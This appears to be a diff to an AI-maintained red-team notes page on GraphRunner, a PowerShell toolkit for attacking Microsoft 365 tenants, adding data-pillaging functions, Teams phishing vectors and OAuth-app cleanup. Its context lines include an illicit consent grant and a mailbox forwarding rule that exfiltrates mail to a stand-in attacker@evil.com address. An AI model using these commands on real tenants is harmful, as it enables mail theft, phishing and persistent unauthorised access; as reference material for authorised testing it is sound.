@@ -15,7 +15,7 @@ Import-Module .\GraphRunner.ps1
 
 > [!note] **See also** — [[Services/Active Directory/Entra ID|Entra ID]] Post-Auth Graph Enumeration and Illicit Consent Grant sections.
 
-> [!warning] **Verified against `GraphRunner.ps1` (2026-08).** Several function names in older guides are wrong — there is **no** `Invoke-DeviceCodeFlow`, `Invoke-SearchTeamsMessages`, `Get-ConditionalAccessPolicies`, `Get-AzureADApps`, or any **OneNote** function. The real names are below; every function takes `-Tokens $tokens`. Run `List-GraphRunnerModules` for the current inventory.
+> [!warning] **Verified against `GraphRunner.ps1` (2026-08; token/OAuth/Teams/Inbox functions re-confirmed line-for-line 2026-09-28).** Several function names in older guides are wrong — there is **no** `Invoke-DeviceCodeFlow`, `Invoke-SearchTeamsMessages`, `Get-ConditionalAccessPolicies`, or `Get-AzureADApps`. The real names are below; every function takes `-Tokens $tokens`. The headline recon/search functions (`Invoke-GraphRunner`, `Invoke-GraphRecon`, `Invoke-Search*`, `List-GraphRunnerModules`) are GraphRunner's documented core but sit past the point a source fetch could reach this pass — the **on-box `List-GraphRunnerModules` inventory confirm is still owed** (standing TODO). Run it for the authoritative current list.
 
 ---
 
@@ -94,6 +94,20 @@ Get-TeamsChat -Tokens $tokens
 
 > [!tip] **Detectors, not one-off terms.** `Invoke-Search*` and `Invoke-GraphRunner` read `default_detectors.json` — edit that file to add your own regex/keywords rather than looping single `-SearchTerm` values by hand.
 
+### More confirmed pillage functions
+
+Additional functions verified present in `GraphRunner.ps1` (2026-09-28) that the sweep above doesn't cover:
+
+```powershell
+Invoke-GraphOpenInboxFinder -Tokens $tokens    # which mailboxes can the current user already read? (shared/open inboxes)
+Find-PermissiveCalendars -Tokens $tokens        # calendars exposed to you — meeting details, attendees, locations
+Invoke-ImmersiveFileReader -Tokens $tokens      # read file contents via the Immersive Reader path
+Get-TeamsApps -Tokens $tokens                   # installed Teams apps (bot/webhook abuse surface)
+Get-ChannelEmail -Tokens $tokens                # a Teams channel's email address — phish straight into the channel
+Find-ChannelEmails -Tokens $tokens
+Get-Webhooks -Tokens $tokens                    # Teams incoming webhooks — post as the channel / phishing
+```
+
 ---
 
 ## Persistence & Backdoors
@@ -101,6 +115,7 @@ Get-TeamsChat -Tokens $tokens
 ```powershell
 # Illicit consent grant — inject an OAuth app and get a consent URL to phish
 Invoke-InjectOAuthApp -Tokens $tokens
+Invoke-DeleteOAuthApp -Tokens $tokens   # clean up the injected app afterward (verified present)
 
 # Mailbox forwarding rule (silent exfil of a user's mail)
 Invoke-CreateInboxForwardingRule -Tokens $tokens -RuleName "Sync" -EmailAddress attacker@evil.com
@@ -117,5 +132,5 @@ Invoke-InviteGuest -Tokens $tokens
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-08-27*
+*Updated: 2026-09-28*
 *Model: claude-opus-5*
